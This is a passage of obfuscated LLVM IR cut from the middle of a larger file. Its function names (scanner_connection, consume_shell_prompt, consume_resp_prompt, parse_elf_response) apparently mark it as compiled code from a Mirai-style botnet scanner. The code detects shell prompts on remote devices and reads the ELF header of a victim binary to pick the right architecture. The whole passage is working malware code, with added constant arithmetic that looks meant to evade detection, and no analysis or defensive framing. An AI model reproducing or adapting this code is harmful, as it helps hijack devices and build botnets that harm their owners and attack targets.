  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 7
  %31 = load i32, i32* %6, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [8192 x i8], [8192 x i8]* %30, i64 0, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 62
  br i1 %36, label %67, label %37

; <label>:37:                                     ; preds = %28
  %38 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %39 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %38, i32 0, i32 7
  %40 = load i32, i32* %6, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [8192 x i8], [8192 x i8]* %39, i64 0, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 36
  br i1 %45, label %67, label %46

; <label>:46:                                     ; preds = %37
  %47 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %48 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %47, i32 0, i32 7
  %49 = load i32, i32* %6, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [8192 x i8], [8192 x i8]* %48, i64 0, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = sext i8 %52 to i32
  %54 = icmp eq i32 %53, 35
  br i1 %54, label %67, label %55

; <label>:55:                                     ; preds = %46
  %56 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %57 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %56, i32 0, i32 7
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [8192 x i8], [8192 x i8]* %57, i64 0, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp eq i32 %62, 37
  br i1 %63, label %64, label %73

; <label>:64:                                     ; preds = %55
  %65 = load i32, i32* %5, align 4
  %66 = icmp eq i32 %65, 1
  br i1 %66, label %67, label %73

; <label>:67:                                     ; preds = %64, %46, %37, %28, %19
  %68 = load i32, i32* %6, align 4
  %69 = add i32 %68, 550647034
  %70 = add i32 %69, 1
  %71 = sub i32 %70, 550647034
  %72 = add nsw i32 %68, 1
  store i32 %71, i32* %8, align 4
  br label %80

; <label>:73:                                     ; preds = %64, %55
  br label %74

; <label>:74:                                     ; preds = %73
  %75 = load i32, i32* %6, align 4
  %76 = sub i32 %75, -1396082333
  %77 = add i32 %76, -1
  %78 = add i32 %77, -1396082333
  %79 = add nsw i32 %75, -1
  store i32 %78, i32* %6, align 4
  br label %16

; <label>:80:                                     ; preds = %67, %16
  %81 = load i32, i32* %8, align 4
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %135

; <label>:83:                                     ; preds = %80
  %84 = load i32, i32* %5, align 4
  %85 = icmp eq i32 %84, 1
  br i1 %85, label %86, label %122

; <label>:86:                                     ; preds = %83
  %87 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %88 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %87, i32 0, i32 7
  %89 = getelementptr inbounds [8192 x i8], [8192 x i8]* %88, i32 0, i32 0
  %90 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %91 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %90, i32 0, i32 4
  %92 = load i32, i32* %91, align 8
  %93 = call i32 @util_memsearch(i8* %89, i32 %92, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.144, i32 0, i32 0), i32 4)
  store i32 %93, i32* %7, align 4
  %94 = icmp ne i32 %93, -1
  br i1 %94, label %95, label %97

; <label>:95:                                     ; preds = %86
  %96 = load i32, i32* %7, align 4
  store i32 %96, i32* %8, align 4
  br label %121

; <label>:97:                                     ; preds = %86
  %98 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %99 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %98, i32 0, i32 7
  %100 = getelementptr inbounds [8192 x i8], [8192 x i8]* %99, i32 0, i32 0
  %101 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %102 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %101, i32 0, i32 4
  %103 = load i32, i32* %102, align 8
  %104 = call i32 @util_memsearch(i8* %100, i32 %103, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.145, i32 0, i32 0), i32 5)
  store i32 %104, i32* %7, align 4
  %105 = icmp ne i32 %104, -1
  br i1 %105, label %106, label %108

; <label>:106:                                    ; preds = %97
  %107 = load i32, i32* %7, align 4
  store i32 %107, i32* %8, align 4
  br label %120

; <label>:108:                                    ; preds = %97
  %109 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %110 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %109, i32 0, i32 7
  %111 = getelementptr inbounds [8192 x i8], [8192 x i8]* %110, i32 0, i32 0
  %112 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %113 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %112, i32 0, i32 4
  %114 = load i32, i32* %113, align 8
  %115 = call i32 @util_memsearch(i8* %111, i32 %114, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.146, i32 0, i32 0), i32 3)
  store i32 %115, i32* %7, align 4
  %116 = icmp ne i32 %115, -1
  br i1 %116, label %117, label %119

; <label>:117:                                    ; preds = %108
  %118 = load i32, i32* %7, align 4
  store i32 %118, i32* %8, align 4
  br label %119

; <label>:119:                                    ; preds = %117, %108
  br label %120

; <label>:120:                                    ; preds = %119, %106
  br label %121

; <label>:121:                                    ; preds = %120, %95
  br label %134

; <label>:122:                                    ; preds = %83
  %123 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %124 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %123, i32 0, i32 7
  %125 = getelementptr inbounds [8192 x i8], [8192 x i8]* %124, i32 0, i32 0
  %126 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %127 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %126, i32 0, i32 4
  %128 = load i32, i32* %127, align 8
  %129 = call i32 @util_memsearch(i8* %125, i32 %128, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.147, i32 0, i32 0), i32 7)
  store i32 %129, i32* %7, align 4
  %130 = icmp ne i32 %129, -1
  br i1 %130, label %131, label %133

; <label>:131:                                    ; preds = %122
  %132 = load i32, i32* %7, align 4
  store i32 %132, i32* %8, align 4
  br label %133

; <label>:133:                                    ; preds = %131, %122
  br label %134

; <label>:134:                                    ; preds = %133, %121
  br label %135

; <label>:135:                                    ; preds = %134, %80
  %136 = load i32, i32* %8, align 4
  %137 = icmp eq i32 %136, -1
  br i1 %137, label %138, label %139

; <label>:138:                                    ; preds = %135
  store i32 0, i32* %3, align 4
  br label %141

; <label>:139:                                    ; preds = %135
  %140 = load i32, i32* %8, align 4
  store i32 %140, i32* %3, align 4
  br label %141

; <label>:141:                                    ; preds = %139, %138
  %142 = load i32, i32* %3, align 4
  ret i32 %142
}

; Function Attrs: noinline nounwind uwtable
define i32 @fdsend(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca [5026 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca [1 x %struct.__va_list_tag], align 16
  store i32 %0, i32* %4, align 4
  store i8* %1, i8** %5, align 8
  store i32 0, i32* %7, align 4
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i32 0, i32 0
  %10 = bitcast %struct.__va_list_tag* %9 to i8*
  call void @llvm.va_start(i8* %10)
  %11 = getelementptr inbounds [5026 x i8], [5026 x i8]* %6, i32 0, i32 0
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i32 0, i32 0
  %14 = call i32 @vsprintf(i8* %11, i8* %12, %struct.__va_list_tag* %13) #7
  store i32 %14, i32* %7, align 4
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i32 0, i32 0
  %16 = bitcast %struct.__va_list_tag* %15 to i8*
  call void @llvm.va_end(i8* %16)
  %17 = load i32, i32* %4, align 4
  %18 = getelementptr inbounds [5026 x i8], [5026 x i8]* %6, i32 0, i32 0
  %19 = load i32, i32* %7, align 4
  %20 = sext i32 %19 to i64
  %21 = call i64 @send(i32 %17, i8* %18, i64 %20, i32 16384)
  %22 = load i32, i32* %7, align 4
  %23 = sext i32 %22 to i64
  %24 = icmp ne i64 %21, %23
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %29

; <label>:26:                                     ; preds = %2
  %27 = load i32, i32* %4, align 4
  %28 = call i64 @send(i32 %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  store i32 1, i32* %3, align 4
  br label %29

; <label>:29:                                     ; preds = %26, %25
  %30 = load i32, i32* %3, align 4
  ret i32 %30
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_shell_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %5, align 4
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 7
  %8 = getelementptr inbounds [8192 x i8], [8192 x i8]* %7, i32 0, i32 0
  %9 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %10 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %9, i32 0, i32 4
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @util_memsearch(i8* %8, i32 %11, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.139, i32 0, i32 0), i32 8)
  %13 = icmp ne i32 %12, -1
  br i1 %13, label %14, label %15

; <label>:14:                                     ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %157

; <label>:15:                                     ; preds = %1
  %16 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %17 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %16, i32 0, i32 7
  %18 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i32 0, i32 0
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 4
  %21 = load i32, i32* %20, align 8
  %22 = call i32 @util_memsearch(i8* %18, i32 %21, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.140, i32 0, i32 0), i32 6)
  %23 = icmp ne i32 %22, -1
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %15
  store i32 -1, i32* %2, align 4
  br label %157

; <label>:25:                                     ; preds = %15
  %26 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %26, i32 0, i32 7
  %28 = getelementptr inbounds [8192 x i8], [8192 x i8]* %27, i32 0, i32 0
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 4
  %31 = load i32, i32* %30, align 8
  %32 = call i32 @util_memsearch(i8* %28, i32 %31, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.141, i32 0, i32 0), i32 9)
  %33 = icmp ne i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %25
  store i32 -1, i32* %2, align 4
  br label %157

; <label>:35:                                     ; preds = %25
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %37, i32 0, i32 0
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 4
  %41 = load i32, i32* %40, align 8
  %42 = call i32 @util_memsearch(i8* %38, i32 %41, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.142, i32 0, i32 0), i32 14)
  %43 = icmp ne i32 %42, -1
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %35
  store i32 -1, i32* %2, align 4
  br label %157

; <label>:45:                                     ; preds = %35
  %46 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %47 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %46, i32 0, i32 7
  %48 = getelementptr inbounds [8192 x i8], [8192 x i8]* %47, i32 0, i32 0
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 4
  %51 = load i32, i32* %50, align 8
  %52 = call i32 @util_memsearch(i8* %48, i32 %51, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.143, i32 0, i32 0), i32 5)
  %53 = icmp ne i32 %52, -1
  br i1 %53, label %54, label %55

; <label>:54:                                     ; preds = %45
  store i32 -1, i32* %2, align 4
  br label %157

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %55
  br label %57

; <label>:57:                                     ; preds = %56
  br label %58

; <label>:58:                                     ; preds = %57
  br label %59

; <label>:59:                                     ; preds = %58
  %60 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %61 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %60, i32 0, i32 4
  %62 = load i32, i32* %61, align 8
  %63 = sub i32 %62, -933929733
  %64 = sub i32 %63, 1
  %65 = add i32 %64, -933929733
  %66 = sub nsw i32 %62, 1
  store i32 %65, i32* %4, align 4
  br label %67

; <label>:67:                                     ; preds = %141, %59
  %68 = load i32, i32* %4, align 4
  %69 = icmp sgt i32 %68, 0
  br i1 %69, label %70, label %147

; <label>:70:                                     ; preds = %67
  %71 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 7
  %73 = load i32, i32* %4, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [8192 x i8], [8192 x i8]* %72, i64 0, i64 %74
  %76 = load i8, i8* %75, align 1
  %77 = sext i8 %76 to i32
  %78 = icmp eq i32 %77, 58
  br i1 %78, label %133, label %79

; <label>:79:                                     ; preds = %70
  %80 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %81 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %80, i32 0, i32 7
  %82 = load i32, i32* %4, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds [8192 x i8], [8192 x i8]* %81, i64 0, i64 %83
  %85 = load i8, i8* %84, align 1
  %86 = sext i8 %85 to i32
  %87 = icmp eq i32 %86, 62
  br i1 %87, label %133, label %88

; <label>:88:                                     ; preds = %79
  %89 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %90 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %89, i32 0, i32 7
  %91 = load i32, i32* %4, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [8192 x i8], [8192 x i8]* %90, i64 0, i64 %92
  %94 = load i8, i8* %93, align 1
  %95 = sext i8 %94 to i32
  %96 = icmp eq i32 %95, 36
  br i1 %96, label %133, label %97

; <label>:97:                                     ; preds = %88
  %98 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %99 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %98, i32 0, i32 7
  %100 = load i32, i32* %4, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds [8192 x i8], [8192 x i8]* %99, i64 0, i64 %101
  %103 = load i8, i8* %102, align 1
  %104 = sext i8 %103 to i32
  %105 = icmp eq i32 %104, 35
  br i1 %105, label %133, label %106

; <label>:106:                                    ; preds = %97
  %107 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %108 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %107, i32 0, i32 7
  %109 = load i32, i32* %4, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds [8192 x i8], [8192 x i8]* %108, i64 0, i64 %110
  %112 = load i8, i8* %111, align 1
  %113 = sext i8 %112 to i32
  %114 = icmp eq i32 %113, 37
  br i1 %114, label %133, label %115

; <label>:115:                                    ; preds = %106
  %116 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %117 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %116, i32 0, i32 7
  %118 = load i32, i32* %4, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [8192 x i8], [8192 x i8]* %117, i64 0, i64 %119
  %121 = load i8, i8* %120, align 1
  %122 = sext i8 %121 to i32
  %123 = icmp eq i32 %122, 93
  br i1 %123, label %133, label %124

; <label>:124:                                    ; preds = %115
  %125 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %126 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %125, i32 0, i32 7
  %127 = load i32, i32* %4, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds [8192 x i8], [8192 x i8]* %126, i64 0, i64 %128
  %130 = load i8, i8* %129, align 1
  %131 = sext i8 %130 to i32
  %132 = icmp eq i32 %131, 126
  br i1 %132, label %133, label %140

; <label>:133:                                    ; preds = %124, %115, %106, %97, %88, %79, %70
  %134 = load i32, i32* %4, align 4
  %135 = sub i32 0, %134
  %136 = sub i32 0, 1
  %137 = add i32 %135, %136
  %138 = sub i32 0, %137
  %139 = add nsw i32 %134, 1
  store i32 %138, i32* %5, align 4
  br label %147

; <label>:140:                                    ; preds = %124
  br label %141

; <label>:141:                                    ; preds = %140
  %142 = load i32, i32* %4, align 4
  %143 = sub i32 %142, 1524193442
  %144 = add i32 %143, -1
  %145 = add i32 %144, 1524193442
  %146 = add nsw i32 %142, -1
  store i32 %145, i32* %4, align 4
  br label %67

; <label>:147:                                    ; preds = %133, %67
  %148 = load i32, i32* %5, align 4
  %149 = icmp eq i32 %148, 0
  br i1 %149, label %150, label %151

; <label>:150:                                    ; preds = %147
  store i32 1, i32* %5, align 4
  br label %151

; <label>:151:                                    ; preds = %150, %147
  %152 = load i32, i32* %5, align 4
  %153 = icmp eq i32 %152, -1
  br i1 %153, label %154, label %155

; <label>:154:                                    ; preds = %151
  store i32 0, i32* %2, align 4
  br label %157

; <label>:155:                                    ; preds = %151
  %156 = load i32, i32* %5, align 4
  store i32 %156, i32* %2, align 4
  br label %157

; <label>:157:                                    ; preds = %155, %154, %54, %44, %34, %24, %14
  %158 = load i32, i32* %2, align 4
  ret i32 %158
}

declare void @table_unlock_val(i8 zeroext) #2

declare i8* @table_retrieve_val(i32, i32*) #2

declare void @table_lock_val(i8 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %7 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub i32 %15, 1975285400
  %17 = sub i32 %16, 1
  %18 = add i32 %17, 1975285400
  %19 = sub nsw i32 %15, 1
  %20 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %18)
  store i32 %20, i32* %5, align 4
  %21 = load i32, i32* %5, align 4
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %24

; <label>:23:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 12)
  store i32 0, i32* %2, align 4
  br label %26

; <label>:24:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 12)
  %25 = load i32, i32* %5, align 4
  store i32 %25, i32* %2, align 4
  br label %26

; <label>:26:                                     ; preds = %24, %23
  %27 = load i32, i32* %2, align 4
  ret i32 %27
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #6

; Function Attrs: noinline nounwind uwtable
define internal i32 @parse_elf_response(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i32 0, i32 0), i8** %6, align 8
  store i32 0, i32* %4, align 4
  br label %9

; <label>:9:                                      ; preds = %39, %1
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %10, 8192
  br i1 %11, label %12, label %44

; <label>:12:                                     ; preds = %9
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 7
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [8192 x i8], [8192 x i8]* %14, i64 0, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = load i8*, i8** %6, align 8
  %21 = load i32, i32* %5, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds i8, i8* %20, i64 %22
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %19, %25
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %12
  %28 = load i32, i32* %5, align 4
  %29 = sub i32 %28, -498539056
  %30 = add i32 %29, 1
  %31 = add i32 %30, -498539056
  %32 = add nsw i32 %28, 1
  store i32 %31, i32* %5, align 4
  %33 = icmp eq i32 %31, 4
  br i1 %33, label %34, label %36

; <label>:34:                                     ; preds = %27
  %35 = load i32, i32* %4, align 4
  store i32 %35, i32* %5, align 4
  br label %44

; <label>:36:                                     ; preds = %27
  br label %38

; <label>:37:                                     ; preds = %12
  store i32 0, i32* %5, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  br label %39

; <label>:39:                                     ; preds = %38
  %40 = load i32, i32* %4, align 4
  %41 = sub i32 0, 1
  %42 = sub i32 %40, %41
  %43 = add nsw i32 %40, 1
  store i32 %42, i32* %4, align 4
  br label %9

; <label>:44:                                     ; preds = %34, %9
  %45 = load i32, i32* %5, align 4
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %48, label %47

; <label>:47:                                     ; preds = %44
  store i32 0, i32* %2, align 4
  br label %181

; <label>:48:                                     ; preds = %44
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 7
  %51 = load i32, i32* %5, align 4
  %52 = add i32 %51, -898335317
  %53 = add i32 %52, 2
  %54 = sub i32 %53, -898335317
  %55 = add nsw i32 %51, 2
  %56 = sext i32 %54 to i64
  %57 = getelementptr inbounds [8192 x i8], [8192 x i8]* %50, i64 0, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %60 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %59, i32 0, i32 11
  store i8 %58, i8* %60, align 2
  %61 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %62 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %61, i32 0, i32 7
  %63 = load i32, i32* %5, align 4
  %64 = sub i32 0, 15
  %65 = sub i32 %63, %64
  %66 = add nsw i32 %63, 15
  %67 = sext i32 %65 to i64
  %68 = getelementptr inbounds [8192 x i8], [8192 x i8]* %62, i64 0, i64 %67
  %69 = load i8, i8* %68, align 1
  %70 = sext i8 %69 to i16
  %71 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 14
  store i16 %70, i16* %72, align 2
  %73 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %74 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %73, i32 0, i32 14
  %75 = load i16, i16* %74, align 2
  %76 = zext i16 %75 to i32
  %77 = icmp eq i32 %76, 65
  br i1 %77, label %78, label %81

; <label>:78:                                     ; preds = %48
  %79 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %80 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %79, i32 0, i32 14
  store i16 8, i16* %80, align 2
  br label %81

; <label>:81:                                     ; preds = %78, %48
  %82 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %83 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %82, i32 0, i32 14
  %84 = load i16, i16* %83, align 2
  %85 = zext i16 %84 to i32
  %86 = icmp eq i32 %85, 0
  br i1 %86, label %93, label %87

; <label>:87:                                     ; preds = %81
  %88 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %89 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %88, i32 0, i32 11
  %90 = load i8, i8* %89, align 2
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 0
  br i1 %92, label %93, label %94

; <label>:93:                                     ; preds = %87, %81
  store i32 -1, i32* %2, align 4
  br label %181

; <label>:94:                                     ; preds = %87
  %95 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %96 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %95, i32 0, i32 14
  %97 = load i16, i16* %96, align 2
  %98 = zext i16 %97 to i32
  %99 = icmp eq i32 %98, 40
  br i1 %99, label %100, label %101

; <label>:100:                                    ; preds = %94
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0), i8** %7, align 8
  br label %174

; <label>:101:                                    ; preds = %94
  %102 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %103 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %102, i32 0, i32 14
  %104 = load i16, i16* %103, align 2
  %105 = zext i16 %104 to i32
  %106 = icmp eq i32 %105, 183
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %101
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8** %7, align 8
  br label %173

; <label>:108:                                    ; preds = %101
  %109 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %110 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %109, i32 0, i32 14
  %111 = load i16, i16* %110, align 2
  %112 = zext i16 %111 to i32
  %113 = icmp eq i32 %112, 62
  br i1 %113, label %114, label %115

; <label>:114:                                    ; preds = %108
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.133, i32 0, i32 0), i8** %7, align 8
  br label %172

; <label>:115:                                    ; preds = %108
  %116 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %117 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %116, i32 0, i32 14
  %118 = load i16, i16* %117, align 2
  %119 = zext i16 %118 to i32
  %120 = icmp eq i32 %119, 8
  br i1 %120, label %121, label %127

; <label>:121:                                    ; preds = %115
  %122 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %123 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %122, i32 0, i32 11
  %124 = load i8, i8* %123, align 2
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 2
  br i1 %126, label %139, label %127

; <label>:127:                                    ; preds = %121, %115
  %128 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %129 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %128, i32 0, i32 14
  %130 = load i16, i16* %129, align 2
  %131 = zext i16 %130 to i32
  %132 = icmp eq i32 %131, 10
  br i1 %132, label %133, label %142

; <label>:133:                                    ; preds = %127
  %134 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %135 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %134, i32 0, i32 11
  %136 = load i8, i8* %135, align 2
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 2
  br i1 %138, label %139, label %142

; <label>:139:                                    ; preds = %133, %121
  %140 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
